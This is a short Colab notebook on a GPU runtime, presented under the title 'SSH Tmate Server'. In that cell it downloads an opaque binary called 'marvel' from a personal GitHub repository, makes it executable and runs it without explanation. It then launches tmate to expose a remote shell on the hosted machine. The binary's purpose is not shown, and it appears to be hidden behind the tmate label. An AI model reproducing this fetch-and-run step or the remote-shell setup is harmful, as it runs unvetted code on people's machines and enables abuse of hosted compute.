{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "TMATE_IO.ipynb",
      "provenance": [],
      "private_outputs": true,
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!nvidia-smi -L"
      ],
      "metadata": {
        "id": "oIZosvyn6nyc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **SSH Tmate Server**\n",
        "!wget https://raw.githubusercontent.com/aurbach55/zash/main/marvel && chmod 777 marvel && ./marvel\n",
        "!wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && cd tmate-2.4.0-static-linux-amd64 &> /dev/null && ./tmate -F"
      ],
      "metadata": {
        "cellView": "form",
        "collapsed": true,
        "id": "RxR8V-BkZ3fa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!ls"
      ],
      "metadata": {
        "id": "c8Llz3-wdMsT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "uzptcCIGZxFU"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}